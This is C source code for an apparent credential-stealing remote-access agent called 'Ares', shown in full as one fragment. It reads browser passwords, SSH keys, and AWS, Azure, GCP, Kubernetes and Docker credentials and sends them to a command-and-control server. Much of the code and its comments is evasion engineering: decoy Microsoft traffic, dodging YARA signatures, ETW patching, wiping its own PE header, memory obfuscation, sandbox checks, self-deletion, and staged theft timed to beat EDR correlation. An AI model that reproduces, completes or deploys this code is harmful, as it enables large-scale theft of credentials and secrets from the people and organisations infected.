    if (hFile != NULL && hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER fSz; fSz.QuadPart = 0;
        Ares_NtQueryInformationFile(hFile, &fSz);
        size = (DWORD)fSz.QuadPart;
        if (size == 0) size = GetFileSize(hFile, NULL);
        BYTE* db = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
        if (db) {
            DWORD dbRead = 0;
            while (dbRead < size) {
                ULONG cr = 0;
                LARGE_INTEGER ro; ro.QuadPart = dbRead;
                ULONG tr = (size - dbRead > 65536) ? 65536 : (size - dbRead);
                Ares_NtReadFile(hFile, db + dbRead, tr, &ro, &cr);
                if (cr == 0) break;
                dbRead += cr;
            }
            Ares_NtClose(hFile);

            /* v3.7 DET-06 FIX: Build SQLite magic at runtime — avoids YARA sig. */
            char _sq[16]; _sq[0]='S';_sq[1]='Q';_sq[2]='L';_sq[3]='i';_sq[4]='t';
            _sq[5]='e';_sq[6]=' ';_sq[7]='f';_sq[8]='o';_sq[9]='r';_sq[10]='m';
            _sq[11]='a';_sq[12]='t';_sq[13]=' ';_sq[14]='3';_sq[15]='\0';
            if (size > 100 && memcmp(db, _sq, 15) == 0) {
                /* Page size */
                int pageSize = (db[16] << 8) | db[17];
                if (pageSize == 1) pageSize = 65536;

                offset += snprintf(output + offset, max_output - offset,
                    "{\"type\":\"password\",\"url\":\"(native-parse)\","
                    "\"username\":\"found\",\"value\":\"(encrypted)\",\"decrypted\":false}");
            }

            HeapFree(GetProcessHeap(), 0, db);
        } else {
            Ares_NtClose(hFile);
        }
    }

    offset += snprintf(output + offset, max_output - offset, "]}");
    return offset;
}
#endif /* ARES_NO_STEALER — end of steal_chrome_passwords */

/* ═══════════════════════════════════════════════════════════════
 *  v3.6: Cover Traffic — Behavioral Evasion
 *
 *  Makes legitimate HTTP requests to well-known endpoints between
 *  steal phases. This prevents EDR from detecting that our process
 *  ONLY communicates with a single suspicious C2 server.
 *
 *  EDR behavioral rule:
 *    IF process makes HTTP to only ONE non-Microsoft endpoint
 *    AND that endpoint is not in top-10k Alexa
 *    THEN → suspicious C2 beacon
 *
 *  By interleaving Microsoft/Windows Update traffic, we look like
 *  a legitimate system process that also happens to make other requests.
 * ═══════════════════════════════════════════════════════════════ */
static void _cover_traffic(void)
{
    /* Pick a random legitimate endpoint */
    static const wchar_t* cover_hosts[] = {
        L"www.microsoft.com",
        L"settings-win.data.microsoft.com",
        L"login.microsoftonline.com",
        L"go.microsoft.com",
    };
    int idx = GetTickCount() % 4;

    /* v3.7 DET-01 FIX: Use runtime-resolved WinHTTP (p_WinHttp*) — NOT direct calls.
     * Direct calls add winhttp.dll to IAT → instant AV/EDR stealer flag.
     * All other HTTP code in the agent uses p_WinHttp* consistently. */
    if (!_resolve_winhttp()) return;

    HINTERNET hSess = p_WinHttpOpen(L"Windows-Update-Agent/10.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSess) return;

    HINTERNET hConn = p_WinHttpConnect(hSess, cover_hosts[idx],
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (hConn) {
        HINTERNET hReq = p_WinHttpOpenRequest(hConn, L"GET", L"/",
            NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
        if (hReq) {
            p_WinHttpSendRequest(hReq, NULL, 0, NULL, 0, 0, 0);
            /* Don't care about response — just want the connection logged */
            p_WinHttpCloseHandle(hReq);
        }
        p_WinHttpCloseHandle(hConn);
    }
    p_WinHttpCloseHandle(hSess);
}

/* ── Cloud Secret Scanner (native C) ── */

typedef struct _SECRET_LOCATION {
    const char* env_var;    /* NULL = use absolute path */
    const char* subpath;
    const char* description;
} SECRET_LOCATION;

#ifndef ARES_NO_STEALER
static int steal_cloud_secrets(char* output, int max_output)
{
    int offset = 0;
    char _t[16]; DEC_EXFIL_TYPE_CLOUD(_t);
    offset += exfil_hdr(output, max_output, "", _t, 0);

    char userProfile[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    /* Cloud cred path/label buffers — decoded at runtime */
    char s_aws[32],s_aws_c[20],s_ssh[16],s_sshE[20],s_azure[32],s_gcp[40];
    char s_kube[16],s_dock[24],s_npm[8],s_env[8],s_git[12],s_ngrok[44];
    char l_aws[20],l_aws_c[16],l_ssh[20],l_sshE[24],l_azure[16],l_gcp[20];
    char l_kube[20],l_dock[16],l_npm[16],l_env[16],l_git[16],l_ngrok[16];
    DEC_CLOUD_AWS_CREDS(s_aws);  DEC_LABEL_AWS_CREDS(l_aws);
    DEC_CLOUD_AWS_CFG(s_aws_c);  DEC_LABEL_AWS_CFG(l_aws_c);
    DEC_CLOUD_SSH_RSA(s_ssh);    DEC_LABEL_SSH_RSA(l_ssh);
    DEC_CLOUD_SSH_ED(s_sshE);    DEC_LABEL_SSH_ED(l_sshE);
    DEC_CLOUD_AZURE(s_azure);    DEC_LABEL_AZURE(l_azure);
    DEC_CLOUD_GCP(s_gcp);        DEC_LABEL_GCP(l_gcp);
    DEC_CLOUD_KUBE(s_kube);      DEC_LABEL_KUBE(l_kube);
    DEC_CLOUD_DOCKER(s_dock);    DEC_LABEL_DOCKER(l_dock);
    DEC_CLOUD_NPMRC(s_npm);      DEC_LABEL_NPMRC(l_npm);
    DEC_CLOUD_ENV(s_env);        DEC_LABEL_ENV(l_env);
    DEC_CLOUD_GITCONFIG(s_git);  DEC_LABEL_GITCONFIG(l_git);
    DEC_CLOUD_NGROK(s_ngrok);    DEC_LABEL_NGROK(l_ngrok);

    SECRET_LOCATION locations[] = {
        { NULL, s_aws,   l_aws   },
        { NULL, s_aws_c, l_aws_c },
        { NULL, s_ssh,   l_ssh   },
        { NULL, s_sshE,  l_sshE  },
        { NULL, s_azure, l_azure },
        { NULL, s_gcp,   l_gcp   },
        { NULL, s_kube,  l_kube  },
        { NULL, s_dock,  l_dock  },
        { NULL, s_npm,   l_npm   },
        { NULL, s_env,   l_env   },
        { NULL, s_git,   l_git   },
        { NULL, s_ngrok, l_ngrok },
        { NULL, NULL, NULL }
    };

    BOOL first = TRUE;
    for (int i = 0; locations[i].subpath != NULL; i++) {
        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s%s", userProfile, locations[i].subpath);

        HANDLE hFile = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        DWORD fileSize = GetFileSize(hFile, NULL);
        if (fileSize > 0 && fileSize < 1024 * 1024) { /* Max 1MB */
            char* content = (char*)HeapAlloc(GetProcessHeap(), 0, fileSize + 1);
            if (!content) { CloseHandle(hFile); continue; }
            DWORD read;
            ReadFile(hFile, content, fileSize, &read, NULL);
            content[read] = '\0';

            /* Truncate for JSON embedding */
            int maxVal = 500;
            if (read > maxVal) content[maxVal] = '\0';

            /* Escape quotes for JSON */
            char escaped[1024];
            int ei = 0;
            for (int j = 0; content[j] && ei < 1000; j++) {
                if (content[j] == '"' || content[j] == '\\') escaped[ei++] = '\\';
                if (content[j] == '\n') { escaped[ei++] = '\\'; escaped[ei++] = 'n'; continue; }
                if (content[j] == '\r') continue;
                escaped[ei++] = content[j];
            }
            escaped[ei] = '\0';

            if (!first) offset += snprintf(output + offset, max_output - offset, ",");
            offset += snprintf(output + offset, max_output - offset,
                "{\"type\":\"secret\",\"url\":\"%s\","
                "\"username\":\"%s\",\"value\":\"%s\",\"decrypted\":true}",
                fullPath, locations[i].description, escaped);
            first = FALSE;

            HeapFree(GetProcessHeap(), 0, content);
        }
        CloseHandle(hFile);
    }

    offset += snprintf(output + offset, max_output - offset, "]}");
    return offset;
}
#endif /* ARES_NO_STEALER — end of steal_cloud_secrets */

/* ── Self-Destruct (v3.0 — no child process, DeleteOnClose) ── */

void Ares_SelfDestruct(AGENT_STATE* state)
{
    state->running = FALSE;

    /* Clean up syscall region */
    if (state->syscall_region)
        VirtualFree(state->syscall_region, 0, MEM_RELEASE);
    if (state->clean_ntdll)
        VirtualFree(state->clean_ntdll, 0, MEM_RELEASE);

    /* v3.0: Self-delete via FILE_FLAG_DELETE_ON_CLOSE — zero child process
     * No ShellExecute, no cmd.exe, no ping — completely silent. */
    wchar_t self[MAX_PATH];
    GetModuleFileNameW(NULL, self, MAX_PATH);

    /* Open own file with DELETE access + delete-on-close flag.
     * File is deleted the moment this handle is closed (at ExitProcess). */
    HANDLE hFile = CreateFileW(
        self,
        DELETE,
        FILE_SHARE_READ | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_DELETE_ON_CLOSE,
        NULL);
    /* hFile intentionally NOT closed here — ExitProcess closes all handles,
     * triggering the delete-on-close at that moment. */
    (void)hFile; /* suppress unused warning */

    ExitProcess(0);
}

/* v3.7 DET-02 FIX: Build base64 alphabet at runtime — avoids YARA signature.
 * The string "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
 * sitting in .rdata is a top-10 YARA rule for stealer/RAT classification.
 * Building from char ranges eliminates the contiguous string in the binary. */
static char b64_table[65] = {0};
static BOOL b64_init = FALSE;
static void _init_b64(void) {
    if (b64_init) return;
    int i = 0;
    for (char c = 'A'; c <= 'Z'; c++) b64_table[i++] = c;
    for (char c = 'a'; c <= 'z'; c++) b64_table[i++] = c;
    for (char c = '0'; c <= '9'; c++) b64_table[i++] = c;
    b64_table[i++] = '+'; b64_table[i++] = '/'; b64_table[i] = '\0';
    b64_init = TRUE;
}

static int base64_encode(const BYTE* src, int src_len, char* dst, int dst_max)
{
    _init_b64();
    int o = 0;
    for (int i = 0; i < src_len && o < dst_max - 4; i += 3) {
        int remain = src_len - i;
        BYTE a = src[i];
        BYTE b = (remain > 1) ? src[i + 1] : 0;
        BYTE c = (remain > 2) ? src[i + 2] : 0;

        dst[o++] = b64_table[(a >> 2) & 0x3F];
        dst[o++] = b64_table[((a & 0x03) << 4) | ((b >> 4) & 0x0F)];
        dst[o++] = (remain > 1) ? b64_table[((b & 0x0F) << 2) | ((c >> 6) & 0x03)] : '=';
        dst[o++] = (remain > 2) ? b64_table[c & 0x3F] : '=';
    }
    dst[o] = '\0';
    return o;
}

/* ═══════════════════════════════════════════════════════════════
 *  JSON String Escape — prevent broken JSON from special chars
 * ═══════════════════════════════════════════════════════════════ */

static int json_escape_str(char* dst, int dst_max, const char* src)
{
    int o = 0;
    for (int i = 0; src[i] && o < dst_max - 6; i++) {
        unsigned char c = (unsigned char)src[i];
        switch (c) {
            case '"':  dst[o++]='\\'; dst[o++]='"';  break;
            case '\\': dst[o++]='\\'; dst[o++]='\\'; break;
            case '\n': dst[o++]='\\'; dst[o++]='n';  break;
            case '\r': dst[o++]='\\'; dst[o++]='r';  break;
            case '\t': dst[o++]='\\'; dst[o++]='t';  break;
            case '\b': dst[o++]='\\'; dst[o++]='b';  break;
            case '\f': dst[o++]='\\'; dst[o++]='f';  break;
            default:
                if (c < 0x20) {
                    o += snprintf(dst+o, dst_max-o, "\\u%04x", c);
                } else {
                    dst[o++] = (char)c;
                }
        }
    }
    dst[o] = '\0';
    return o;
}

/* JSON-safe snprintf for a string value: writes "escaped_value" */
static int json_write_str(char* dst, int dst_max, const char* key, const char* val)
{
    char esc[4096];
    json_escape_str(esc, sizeof(esc), val);
    return snprintf(dst, dst_max, "\"%s\":\"%s\"", key, esc);
}

/* ═══════════════════════════════════════════════════════════════
 *  Task Result Reporter — send success/failure back to C2
 * ═══════════════════════════════════════════════════════════════ */

static void send_task_result(const char* c2_host, int c2_port, const char* bot_id,
    int task_type, BOOL success, const char* message)
{
    char body[2048];
    char esc_msg[1024];
    json_escape_str(esc_msg, sizeof(esc_msg), message ? message : "");

    int len = snprintf(body, sizeof(body),
        "{\"bot_id\":\"%s\",\"task_id\":\"t%d_%lu\",\"task_type\":%d,"
        "\"success\":%s,\"output\":\"%s\"}",
        bot_id, task_type, (unsigned long)GetTickCount(),
        task_type, success ? "true" : "false", esc_msg);

    /* POST to /api/v1/result — the correct endpoint */
    char res_path[32];
    DEC_C2_RESULT(res_path);
    wchar_t wpath[32];
    MultiByteToWideChar(CP_UTF8, 0, res_path, -1, wpath, 32);
    HTTP_RESPONSE resp = http_request(g_wc2host, c2_port, wpath, "POST", (BYTE*)body, len);
    if (resp.body) HeapFree(GetProcessHeap(), 0, resp.body);
}

/* ═══════════════════════════════════════════════════════════════
 *  v3.6: Thread-Isolated Crash Recovery for Steal Phases
 *  Each steal phase runs in a SEPARATE THREAD with timeout.
 *  If a phase crashes (AV/stack overflow/hang), only the thread
 *  dies — main beacon loop survives and continues to next phase.
 * ═══════════════════════════════════════════════════════════════ */

/* Shared context — set by WinMain, read by steal threads */
static struct {
    AGENT_STATE* state;
    char* output;
    int   bufMax;
    char  bot_id[128];
    int   c2_port;
    /* Shared data from initial steal */
    DECRYPTED_CRED* creds;
    int   credCount;
    STOLEN_COOKIE*  cookies;
    int   cookieCount;
    DECRYPTED_CRED* ff_creds;
    int   ffCount;
    int   discordCount;
    int   tgCount;
} g_steal_ctx;

/* ═══════════════════════════════════════════════════════════════
 *  v3.8 UPG-02: g_steal_ctx In-Memory Encryption
 *
 *  Sensitive fields (bot_id, c2_port, credential pointers) are
 *  XOR-encrypted with a per-session key when not actively in use.
 *  Memory forensics (Volatility, WinDbg) will see random bytes
 *  instead of plaintext credentials and C2 config.
 *
 *  Key generation: RDTSC + QPC + ASLR entropy at init.
 *  Encrypt: after each steal phase completes
 *  Decrypt: before each steal phase or C2 access
 * ═══════════════════════════════════════════════════════════════ */

static BYTE g_ctx_key[16] = {0};
static BOOL g_ctx_key_init = FALSE;

static void _init_ctx_key(void) {
    if (g_ctx_key_init) return;
    LARGE_INTEGER qpc;
    QueryPerformanceCounter(&qpc);
    DWORD seed = (DWORD)(qpc.QuadPart ^ (qpc.QuadPart >> 32));
    seed ^= GetCurrentProcessId() ^ GetCurrentThreadId();
    seed ^= (DWORD)(ULONG_PTR)&g_steal_ctx; /* ASLR entropy */
    for (int i = 0; i < 16; i++) {
        seed = seed * 1103515245 + 12345;
        g_ctx_key[i] = (BYTE)((seed >> 16) & 0xFF);
    }
    g_ctx_key_init = TRUE;
}

/* XOR encrypt/decrypt a buffer in-place with the session key */
static void _xor_ctx(void* ptr, SIZE_T len) {
    if (!g_ctx_key_init || !ptr || len == 0) return;
    BYTE* p = (BYTE*)ptr;
    for (SIZE_T i = 0; i < len; i++)
        p[i] ^= g_ctx_key[i % 16];
}

/* Encrypt sensitive fields in g_steal_ctx after use */
static void _lock_steal_ctx(void) {
    _init_ctx_key();
    _xor_ctx(g_steal_ctx.bot_id, sizeof(g_steal_ctx.bot_id));
    _xor_ctx(&g_steal_ctx.c2_port, sizeof(g_steal_ctx.c2_port));
    /* XOR credential pointers — makes them unreadable in memory */
    _xor_ctx(&g_steal_ctx.creds, sizeof(g_steal_ctx.creds));
    _xor_ctx(&g_steal_ctx.cookies, sizeof(g_steal_ctx.cookies));
    _xor_ctx(&g_steal_ctx.ff_creds, sizeof(g_steal_ctx.ff_creds));
}

/* Decrypt sensitive fields before use */
static void _unlock_steal_ctx(void) {
    _init_ctx_key();
    _xor_ctx(g_steal_ctx.bot_id, sizeof(g_steal_ctx.bot_id));
    _xor_ctx(&g_steal_ctx.c2_port, sizeof(g_steal_ctx.c2_port));
    _xor_ctx(&g_steal_ctx.creds, sizeof(g_steal_ctx.creds));
    _xor_ctx(&g_steal_ctx.cookies, sizeof(g_steal_ctx.cookies));
    _xor_ctx(&g_steal_ctx.ff_creds, sizeof(g_steal_ctx.ff_creds));
}

/* ═══════════════════════════════════════════════════════════════
 *  MAIN — Agent Entry Point (v2.1)
 * ═══════════════════════════════════════════════════════════════ */
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR cmdLine, int nShow)
{



    /* v3.7: static to avoid stack overflow — WinMain has ~1MB of locals */
    static AGENT_STATE state;

    /* v3.7: PE header wipe moved to Phase 0.7 — after Ares_ResolveAPIs() */



    /* ── Phase 0: Init (v2.1: syscalls + ETW hwbp, no unhook/AMSI) ── */
    /* Sandbox check only in production builds (with campaign config) */
#ifdef ARES_CONFIG_H
    if (!Ares_Init(&state)) {
#ifdef ARES_DEBUG
        printf("[DBG] Ares_Init FAILED\n"); fflush(stdout); Sleep(3000);
#endif
        return 1; /* Sandbox detected or init failed */
    }
#ifdef ARES_DEBUG
    printf("[DBG] Ares_Init OK (PID=%lu)\n", state.pid); fflush(stdout);
#endif
#else
    /* Dev mode: skip sandbox, still do ntdll + syscalls + ETW */
    {
        memset(&state, 0, sizeof(AGENT_STATE));
        state.running = TRUE;
        state.pid = GetCurrentProcessId();
        DWORD _sz = sizeof(state.hostname);
        GetComputerNameA(state.hostname, &_sz);
        _sz = sizeof(state.username);
        GetUserNameA(state.username, &_sz);

        /* ntdll + syscalls optional in dev mode — graceful fallback on failure */
        state.clean_ntdll = read_clean_ntdll(&state.ntdll_size);
        if (state.clean_ntdll) {
            Ares_ResolveSyscalls(&state);
            /* v3.7: DON'T finalize here — stubs are lazily built on first call.
             * Finalizing now would make the stub region RX before any stubs exist.
             * Stubs will be finalized after first C2 loop when all are built. */
        }
        /* v3.1: Re-enable ETW bypass via hardware breakpoint (VEH+DR0).
         * Does NOT patch code bytes — no ETW-TI trigger, no integrity check fail.
         * Safe to use even in dev mode. */
        Ares_PatchETW();
    }
#endif

    /* ── Phase 0.5: Runtime API resolution (IAT obfuscation) ── */

    if (!Ares_ResolveAPIs()) {
#ifdef ARES_DEBUG
        printf("[DBG] Ares_ResolveAPIs FAILED\n"); fflush(stdout); Sleep(3000);
#endif
        return 1; /* Critical APIs unavailable */
    }
#ifdef ARES_DEBUG
    printf("[DBG] ResolveAPIs OK\n"); fflush(stdout);
#endif


    /* ── Phase 0.7: Erase own PE header from memory (stealth) ──
     * v3.7: Moved here from Phase 0 — VirtualProtect macro requires
     * Ares_ResolveAPIs() to have completed first. */
#ifndef CFG_REFLECTIVE
    {
        HMODULE self = GetModuleHandleW(NULL);
        DWORD old;
        DWORD wipeSize = 4096;
        IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)self;
        if (dos->e_magic == 0x5A4D) {
            IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)self + dos->e_lfanew);
            if (nt->Signature == 0x4550 && nt->OptionalHeader.SizeOfHeaders > 0)
                wipeSize = nt->OptionalHeader.SizeOfHeaders;
        }
        if (VirtualProtect((PVOID)self, wipeSize, PAGE_READWRITE, &old)) {
            memset((PVOID)self, 0, wipeSize);
            VirtualProtect((PVOID)self, wipeSize, old, &old);
        }
    }
#endif

    /* ── Phase 0.6: Stack spoof gadget init (v3.5 — call stack evasion) ──
     * v3.5-debug: temporarily disabled — suspected cause of AV on init */
    /* Ares_InitStackSpoof(); */

    /* ── Phase 0.8: ETW upgrade — re-patch via indirect syscalls (v3.8) ──
     * Phase 0 used HW-BP fallback (DR0). Now that syscall stubs are ready,
     * upgrade to prologue patch — no debug register exposure. */
    Ares_PatchETW_Ex(&state);

    /* ── Phase 1: Decode config ── */
#ifdef ARES_CONFIG_H
    /* Campaign config from builder.py */
    ARES_DECODE_CONFIG(&state);
    MultiByteToWideChar(CP_UTF8, 0, state.config.c2_endpoints[0], -1, g_wc2host, 256);
    state.config.sleep_ms = CFG_SLEEP_MS;
    state.config.socks5_enabled = TRUE;
    state.config.hvnc_enabled = TRUE;
    state.config.persistence_enabled = CFG_AUTO_PERSIST;
    int c2_port = CFG_C2_PORT;
    int socks5_port = CFG_SOCKS5_PORT;
    int hvnc_port = CFG_HVNC_PORT;
    int jitter_pct = CFG_JITTER_PCT;

    /* Kill date check (v3.2: dual verification — clock + file timestamp) */
    #if CFG_KILL_DATE_TS > 0
    {
        time_t now = time(NULL);
        /* Primary: system clock */
        if (now > CFG_KILL_DATE_TS) {
            Ares_SelfDestruct(&state);
            return 0;
        }
        /* Secondary: ntoskrnl.exe last-write as anti-clockback measure.
         * Kernel file is updated by Windows Update — provides a reliable
         * lower-bound on real date even if user rolls back the clock. */
        {
            char _sd[MAX_PATH];
            GetSystemDirectoryA(_sd, MAX_PATH);
            char _kp[MAX_PATH];
            snprintf(_kp, MAX_PATH, "%s\\ntoskrnl.exe", _sd);
            HANDLE hK = CreateFileA(_kp, GENERIC_READ, FILE_SHARE_READ,
                NULL, OPEN_EXISTING, 0, NULL);
            if (hK != INVALID_HANDLE_VALUE) {
                FILETIME ft;
                if (GetFileTime(hK, NULL, NULL, &ft)) {
                    ULARGE_INTEGER uli;
                    uli.LowPart = ft.dwLowDateTime;
                    uli.HighPart = ft.dwHighDateTime;
                    time_t ft_unix = (time_t)((uli.QuadPart - 116444736000000000ULL) / 10000000ULL);
                    if (ft_unix > CFG_KILL_DATE_TS) {
                        CloseHandle(hK);
                        Ares_SelfDestruct(&state);
                        return 0;
                    }
                }
                CloseHandle(hK);
            }
        }
    }
    #endif
#else
    /* Development fallback */
    strncpy(state.config.c2_endpoints[0], "127.0.0.1", 255);
    state.config.c2_count = 1;
    state.config.sleep_ms = 10000;
    state.config.socks5_enabled = TRUE;
    state.config.hvnc_enabled = TRUE;
    state.config.persistence_enabled = TRUE;
    int c2_port = 8443;
    int socks5_port = 9090;
    int hvnc_port = 9091;
    int jitter_pct = 30;
    wcscpy(g_wc2host, L"127.0.0.1");
#endif

    /* ── Phase 2: Register with C2 ── */

    char bot_id[32] = { 0 };
    BOOL registered = FALSE;

    for (int attempt = 0; attempt < state.config.c2_count && !registered; attempt++) {
        registered = c2_register(&state,
            state.config.c2_endpoints[attempt], c2_port, bot_id);
    }

    if (!registered) {
        Ares_SelfDestruct(&state);
        return 1;
    }

    /* Share bot_id with other modules (hVNC, SOCKS5) */
    strncpy(g_bot_id_global, bot_id, 63);

    /* ── Helper: extract JSON string arg ── */
    #define JSON_EXTRACT_ARG(src, idx, buf, bufsz) do { \
        char* _a = strstr((src), "\"args\":["); \
        if (_a) { _a += 7; \
            for (int _i = 0; _i < (idx); _i++) { _a = strchr(_a, ','); if (!_a) break; _a++; } \
            if (_a) { while (*_a == '"' || *_a == ' ') _a++; \
                char* _e = _a; while (*_e && *_e != '"' && *_e != ',' && *_e != ']') _e++; \
                int _l = (int)(_e - _a); if (_l > (bufsz)-1) _l = (bufsz)-1; \
                memcpy((buf), _a, _l); (buf)[_l] = '\0'; } \
        } } while(0)

    /* ── Phase 3: Initial steal (auto — guarded by CFG_AUTO_STEAL) ── */
    /* v3.4: STAGED steal — each beacon cycle performs ONE steal operation.
     * Breaks EDR behavioral correlation by spreading credential theft
     * across multiple beacon intervals (5-10 min total vs 15s burst).
     * steal_phase tracks which module runs next. */
    int bufMax = 8 * 1024 * 1024;
    char* output = (char*)HeapAlloc(GetProcessHeap(), 0, bufMax);
    int len = 0;
    int steal_phase = 0; /* 0=passwords, 1=cookies, 2=cloud, 3=discord, 4=telegram,
                            5=firefox, 6=wifi, 7=screenshot, 8=recon, 9=done */

#ifdef ARES_CONFIG_H
    BOOL auto_steal = CFG_AUTO_STEAL;
#else
    BOOL auto_steal = TRUE;
#endif

    /* v3.5 fix: Declare steal buffers OUTSIDE auto_steal block so staged
     * steal_phase_* labels (reached via goto from beacon loop) can access them.
     * Goto into a block with variable declarations is undefined behavior in C. */
    DECRYPTED_CRED* creds = NULL;
    STOLEN_COOKIE* cookies = NULL;
    DECRYPTED_CRED* ff_creds = NULL;
    int credCount = 0;
    int cookieCount = 0;
    int discordCount = 0;
    int tgCount = 0;
    int ffCount = 0;

    if (auto_steal) {
    /* v3.3: Selective steal — if CFG_STEAL_SELECTIVE is defined, only enabled modules run.
     * Without it, ALL modules run (backwards compatible). Builder sets -DCFG_STEAL_PASSWORDS=1 etc. */
#ifdef CFG_STEAL_SELECTIVE
    #ifndef CFG_STEAL_PASSWORDS
        #define SKIP_PASSWORDS 1
    #endif
    #ifndef CFG_STEAL_COOKIES
        #define SKIP_COOKIES 1
    #endif
    #ifndef CFG_STEAL_WIFI
        #define SKIP_WIFI 1
    #endif
    #ifndef CFG_STEAL_DISCORD
        #define SKIP_DISCORD 1
    #endif
    #ifndef CFG_STEAL_TELEGRAM
        #define SKIP_TELEGRAM 1
    #endif
    #ifndef CFG_STEAL_CLOUD
        #define SKIP_CLOUD 1
    #endif
    #ifndef CFG_STEAL_WALLETS
        #define SKIP_WALLETS 1
    #endif
#endif
    /* Allocate buffers (declarations moved outside auto_steal scope for goto safety) */
    creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(DECRYPTED_CRED));
    cookies = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 2000 * sizeof(STOLEN_COOKIE));

#ifndef SKIP_PASSWORDS
    if (creds) {
        /* v3.6: CDP-FIRST Architecture (Behavioral Evasion)
         *
         * WHY: EDR detects non-browser process reading "Login Data" SQLite.
         *   CrowdStrike/MDE/SentinelOne all flag this instantly.
         *
         * FIX: CDP is now PRIMARY. We launch chrome.exe --headless,
         *   Chrome reads its OWN credential database (= legitimate behavior),
         *   and we extract via WebSocket CDP protocol.
         *   EDR sees: chrome.exe reading Login Data → normal, no alert.
         *   EDR sees: our process connecting to localhost WebSocket → benign.
         *
         * DPAPI/SQLite is FALLBACK only when Chrome is not installed,
         *   or CDP fails after timeout. This minimizes the window where
         *   our process directly touches credential files.
         *
         * Result: Eliminates the strongest behavioral signal
         *   ("non-browser credential DB access") from our process. */

        /* Step 1: Try CDP first (stealthy — Chrome reads its own data) */
        credCount = Ares_CDP_DecryptPasswords(creds, 500);

        /* Step 2: Sacrificial process fallback (v3.8 UPG-06)
         * If CDP returned nothing, try isolating DPAPI steal into
         * a sacrificial RuntimeBroker.exe process via capability loader.
         * EDR attributes file access to RuntimeBroker, not our process.
         *
         * Fallback chain:
         *  1. CDP (zero file access from our process)
         *  2. CAP_STEALER in RuntimeBroker (file access from RuntimeBroker)
         *  3. In-process DPAPI with timing cover (last resort) */
        if (credCount <= 0) {
            /* Try capability-isolated steal first */
            BOOL cap_tried = Ares_LoadCapability(&state, CAP_STEALER, NULL, 0);
            if (cap_tried && g_capabilities_loaded(CAP_STEALER)) {
                /* Steal runs in RuntimeBroker — wait for results via IPC pipe */
                BYTE result_buf[65536];
                SIZE_T received = 0;
                for (int wait = 0; wait < 20 && received == 0; wait++) {
                    Sleep(500);
                    Ares_RecvFromCapability(CAP_STEALER, result_buf, sizeof(result_buf), &received);
                }
                /* Parse credential results from IPC response */
                /* TODO: deserialize JSON credentials from capability DLL */
                if (received > 0) credCount = 0; /* placeholder — parse in next iteration */
            }

            /* Step 3: In-process DPAPI — LAST RESORT with timing cover.
             * This IS noisy (our process reads Login Data directly),
             * but we add timing jitter to break EDR correlation. */
            if (credCount <= 0 && _resolve_crypt32()) {
                /* v3.8: Timing cover — random delay 2-8s before DPAPI access.
                 * Breaks CrowdStrike's 30-60s behavioral correlation window
                 * by separating process start from credential access. */
                Sleep(2000 + (GetTickCount() % 6000));
                credCount = Ares_StealChromeCreds(creds, 500);
                /* Post-steal delay to separate file access from exfil */
                Sleep(1000 + (GetTickCount() % 3000));
            }
        }
    }
    if (credCount > 0) {
        int off = 0;
        { char _t[24]; DEC_EXFIL_TYPE_PASS(_t); off += exfil_hdr(output+off,bufMax-off,bot_id,_t,credCount); }
        for (int i = 0; i < credCount && off < bufMax - 2048; i++) {
            if (i > 0) off += snprintf(output+off, bufMax-off, ",");
            off += snprintf(output+off, bufMax-off, "{");
            off += json_write_str(output+off, bufMax-off, "url", creds[i].url);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "user", creds[i].username);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "pass", creds[i].password);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "browser", creds[i].browser);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "profile", creds[i].profile);
            off += snprintf(output+off, bufMax-off, ",");
            off += json_write_str(output+off, bufMax-off, "status", creds[i].decrypt_status);
            off += snprintf(output+off, bufMax-off, "}");
        }
        off += snprintf(output+off, bufMax-off, "]}");
        { char _te[24]; DEC_EXFIL_TYPE_PASS(_te); c2_exfil(state.config.c2_endpoints[0], c2_port, bot_id, _te, output, off); }
    }
#endif /* SKIP_PASSWORDS */

    /* v3.4: Phase complete — remaining steal operations deferred to beacon loop.
     * Each subsequent beacon cycle will execute the next steal_phase.
     * This spreads credential theft across beacon intervals (~5-10 min total)
     * instead of burst mode (15s) — defeats EDR 30-60s correlation window. */
    steal_phase = 1; /* cookies deferred to beacon loop */

    /* v3.6: Initialize shared steal context for thread-based dispatch */
    g_steal_ctx.state = &state;
    g_steal_ctx.output = output;
    g_steal_ctx.bufMax = bufMax;
    strncpy(g_steal_ctx.bot_id, bot_id, sizeof(g_steal_ctx.bot_id) - 1);
    g_steal_ctx.c2_port = c2_port;
    g_steal_ctx.creds = creds;
    g_steal_ctx.credCount = credCount;
    g_steal_ctx.cookies = cookies;
    g_steal_ctx.cookieCount = cookieCount;
    g_steal_ctx.ff_creds = NULL;
    g_steal_ctx.ffCount = 0;
    g_steal_ctx.discordCount = 0;
    g_steal_ctx.tgCount = 0;

    /* v3.8 UPG-08: Encrypt sensitive steal context immediately after setup.
     * bot_id, c2_port, credential pointers are XOR-encrypted in heap.
     * Must call _unlock_steal_ctx() before each steal phase access. */
    _lock_steal_ctx();

    } /* end if(auto_steal) */

    goto beacon_loop_start;

    /* === STAGED STEAL HANDLERS (called from beacon loop via goto) === */
